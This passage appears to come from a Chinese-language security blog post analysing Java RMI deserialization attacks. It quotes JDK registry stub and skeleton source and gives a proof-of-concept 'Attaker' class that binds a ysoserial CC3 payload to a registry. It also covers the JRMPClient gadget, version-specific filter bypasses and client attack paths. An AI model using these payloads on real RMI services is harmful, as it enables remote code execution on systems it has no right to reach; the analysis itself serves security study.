</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>server</span><span class=o>.</span><span class=na>rebind</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>,</span> <span class=n>$param_Remote_2</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>4</span><span class=o>:</span> <span class=c1>// unbind(String)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Check access before reading the arguments
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>RegistryImpl</span><span class=o>.</span><span class=na>checkAccess</span><span class=o>(</span><span class=s>&#34;Registry.unbind&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>server</span><span class=o>.</span><span class=na>unbind</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nl>
</span></span></span><span class=line><span class=cl><span class=nl>        default:</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;invalid method number&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>从代码中可以看出，Server可以调用Registry对外暴露的以下方法：</p><ul><li>bind(String, Remote)</li><li>list()</li><li>lookup()</li><li>rebind(String, Remote)</li><li>unbind(String)</li></ul><p>也就是说：Server可以通过Registry_Stub类对象来调用以上方法，且从RegistryImpl_Skel#dispatch方法的代码中也可以看到，RegistryImpl_Skel在调用RegistryImpl之前会对传递过来的参数进行反序列化。例如我们看到case 0的操作：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>case</span> <span class=n>0</span><span class=o>:</span> <span class=c1>// bind(String, Remote)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Check access before reading the arguments
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>RegistryImpl</span><span class=o>.</span><span class=na>checkAccess</span><span class=o>(</span><span class=s>&#34;Registry.bind&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$param_Remote_2</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>$param_Remote_2</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=na>bind</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>,</span> <span class=n>$param_Remote_2</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个就代表：Server通过RegistryImpl_Stub调用 <code>bind(String, Remote)</code> 方法时，Registry端的RegistryImpl_Skel对应的处理。（这也体现了RMI调用过程，其实是Stub和Skel的通信）。定位到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=n>$param_Remote_2</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看出，就是对Server中调用RegistryImpl_Skel#bind(String, Remote)方法传递过来的字符串和Remote对象进行反序列化操作。很明显，这就是一个攻击点：攻击者伪造成Server，通过调用RegistryImpl_Skel#bind(String, Remote)，传递一个恶意的序列化对象，Registry进行反序列化时即会造成RCE（当然，Registry得存在Gadget）。</p><p>例如如下代码，我伪造一个Server，向Registry发送一个恶意的Remote对象，这个对象其实就是ysoserial中的CC3（靶机需要JDK&lt;=8u66才能打），通过动态代理将CC3 Payload代理成Remote类型对象，然后发送给Registry：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/7/29 18:38
</span></span></span><span class=line><span class=cl><span class=cm> * 模拟攻击方
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Attaker</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>cmd</span> <span class=o>=</span> <span class=n>Proxy</span><span class=o>.</span><span class=na>newProxyInstance</span><span class=o>(</span><span class=n>Remote</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>getClassLoader</span><span class=o>(),</span> <span class=k>new</span> <span class=n>Class</span><span class=o>[]{</span><span class=n>Remote</span><span class=o>.</span><span class=na>class</span><span class=o>},</span> <span class=o>(</span><span class=n>InvocationHandler</span><span class=o>)</span> <span class=n>CC3</span><span class=o>.</span><span class=na>getPayload</span><span class=o>(</span><span class=s>&#34;calc&#34;</span><span class=o>));</span>
</span></span><span class=line><span class=cl>        <span class=n>Remote</span> <span class=n>remote</span> <span class=o>=</span> <span class=n>Remote</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>cast</span><span class=o>(</span><span class=n>cmd</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>registry</span><span class=o>.</span><span class=na>bind</span><span class=o>(</span><span class=s>&#34;hackYou&#34;</span><span class=o>,</span> <span class=n>remote</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Registry成功反序列化，并且RCE：</p><p><img src=/media/2021-07-29-5.png alt></p><p>根据Registry返回的报错信息也可以看到，是因为RegistryImpl_Skel#dispatch中进行了反序列化导致的RCE。</p><p>现在理清一下思路，攻击Registry，只需要观察RegistryImpl_Skel#dispatch方法的几个case，看下哪个case里面存在readObject反序列化操作。我们看到case 0（bind(String, Remote)）和case 3（rebind(String, Remote)）中存在 <code>(java.rmi.Remote) in.readObject();</code> 进行反序列化。但是其他case中，却只有 <code>(java.lang.String) in.readObject();</code> 反序列化。</p><p>前面我们演示过程中，攻击者传递的是一个恶意的Remote类型对象，在case 0的时候调用了 <code>(java.rmi.Remote) in.readObject();</code> 反序列化达到RCE。但是其实理论上，只有有readObject，就都能进行反序列化RCE，现在问题是：攻击者通过RegistryImpl_Stub调用的各个方法（bind()、unbind()、rebind()等），都有参数类型限制，比如bind方法，就限制形参类型为：String和Remote。我们无法直接使用这些方法传递任意类型的恶意序列化对象，例如下面所示，我试图传递一个Object类型的对象，但是参数类型不符合，导致编译不通过，无法发送：</p><p><img src=/media/2021-07-29-6.png alt></p><p>但是因为发送端是我们攻击者完全可控的，我们其实可以绕~通过重写bind()函数等方式控制发送其他任意类型的序列化数据，达到Attack Registry的目的（当然，还有很多其他方式可以发送任意类型对象）。</p><p>现在再分析当JDK>=8u121时的情况。我们把JDK的版本调到8u211，再次启动攻击，发现Registry返回如下错误提示：</p><p><img src=/media/2021-07-29-7.png alt></p><p>这是因为JDK8u121的时候，加入了反序列化白名单，我们Debug到RegistryImpl#registryFilter函数，即可看到有白名单限制：</p><p><img src=/media/2021-07-29-8.png alt></p><p>这时候，ysoserial中就横空出世一个JRMPClient的Gadget：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>ObjID</span> <span class=n>id</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ObjID</span><span class=o>(</span><span class=k>new</span> <span class=n>Random</span><span class=o>().</span><span class=na>nextInt</span><span class=o>());</span> <span class=c1>// RMI registry
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>TCPEndpoint</span> <span class=n>te</span> <span class=o>=</span> <span class=k>new</span> <span class=n>TCPEndpoint</span><span class=o>(</span><span class=n>host</span><span class=o>,</span> <span class=n>port</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=n>UnicastRef</span> <span class=n>ref</span> <span class=o>=</span> <span class=k>new</span> <span class=n>UnicastRef</span><span class=o>(</span><span class=k>new</span> <span class=n>LiveRef</span><span class=o>(</span><span class=n>id</span><span class=o>,</span> <span class=n>te</span><span class=o>,</span> <span class=kc>false</span><span class=o>));</span>
</span></span><span class=line><span class=cl><span class=n>RemoteObjectInvocationHandler</span> <span class=n>obj</span> <span class=o>=</span> <span class=k>new</span> <span class=n>RemoteObjectInvocationHandler</span><span class=o>(</span><span class=n>ref</span><span class=o>);</span>
</span></span></code></pre></td></tr></table></div></div><p>并且这个类（及其父类）在白名单内，是可以被Registry反序列化的。那么这个Gadget的触发点在哪里呢？以下是被攻击的Registry的调用栈：</p><p><img src=/media/2021-07-29-9.png alt></p><p>整个过程其实就是：被攻击的Registry反序列化JRMP Gadget后会与攻击者的RMI Registry连接上，执行分布式GC（调用了GCImpl_Stub#dirty可体现出），并且攻击者的RMI Registry会发送恶意的反序列化对象给Registry靶机，最终造成反序列化漏洞。</p><p>总而言之，<strong>JRMP Gadget主要是在DGC层造成了一个反序列化，但是这个漏洞在JDK8u231进行了修复</strong> 。也就是如果小于JDK&lt;8u231，是可以用JRMP Gadget攻击任何RMI实体的（Client、Registry、Server）。但是后续 <strong>存在 <code>UnicastRemoteObject Gadget</code> 可以继续绕过JDK8u231的修复，在JDK8u241再次进行了修复</strong> 。</p><h3 id=攻击client>攻击Client</h3><p>对于攻击方式，当Client使用 <code>InitialContext#lookup()</code> 来进行RMI调用的话，还可以在攻击机的Registry中使用 <code>Refererence Gadget</code> 来攻击Client。也就是说，存在如下攻击方式（以下分析基于JDK8u66）：</p><ol><li>Client调用RegistryImpl_Stub#lookup()等方法，反序列化攻击者的Registry返回的恶意序列化对象，造成攻击，需要靶机有Gadget；</li><li>JDK Version &lt; JDK8u121时，Client使用 <code>InitialContext#lookup()</code> 方式来进行RMI调用，此时可以使用 <code>Refererence Gadget</code> 来攻击Client，无需靶机存在反序列化Gadget。JDK8u121之后添加了trustURLCodebase限制，RMI下无法使用此方式进行攻击；</li><li>JDK8u121 &lt;= JDK Version &lt;= JDK8u191时，Client使用 <code>InitialContext#lookup()</code> 方式来进行Ldap调用，此时可以使用 <code>Refererence Gadget</code> 来攻击Client，无需靶机存在反序列化Gadget。</li></ol><p>首先分析第一种方式，这种 <strong>要求使用非JNDI方式的rmi请求</strong> 。因为现在攻击的是Client，所以我们看到RegistryImpl_Stub#lookup()方法的源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// implementation of lookup(String)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=nf>lookup</span><span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=kd>throws</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>AccessException</span><span class=o>,</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>NotBoundException</span><span class=o>,</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>RemoteException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>server</span><span class=o>.</span><span class=na>RemoteCall</span> <span class=n>call</span> <span class=o>=</span> <span class=n>ref</span><span class=o>.</span><span class=na>newCall</span><span class=o>((</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>server</span><span class=o>.</span><span class=na>RemoteObject</span><span class=o>)</span> <span class=k>this</span><span class=o>,</span> <span class=n>operations</span><span class=o>,</span> <span class=n>2</span><span class=o>,</span> <span class=n>interfaceHash</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectOutput</span> <span class=n>out</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>out</span><span class=o>.</span><span class=na>writeObject</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=n>ref</span><span class=o>.</span><span class=na>invoke</span><span class=o>(</span><span class=n>call</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$result</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>$result</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ref</span><span class=o>.</span><span class=na>done</span><span class=o>(</span><span class=n>call</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>$result</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>RuntimeException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=n>e</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>RemoteException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=n>e</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>NotBoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=n>e</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Exception</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnexpectedException</span><span class=o>(</span><span class=s>&#34;undeclared checked exception&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到lookup()方法中 <code>$result = (java.rmi.Remote) in.readObject()</code> ，会对Registry返回的数据进行反序列化，，如果我们可以控制Client的lookup()的Registry的地址，那么我们就可以伪造一个恶意的Registry，返回一个恶意的序列化对象让Client反序列化造成攻击；</p><p>Client请求Registry进行lookup操作，那我们再看看Registry中的RegistryImpl_Skel#dispatch中的lookup处理代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>case</span> <span class=n>2</span><span class=o>:</span> <span class=c1>// lookup(String)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span> <span class=n>$param_String_1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
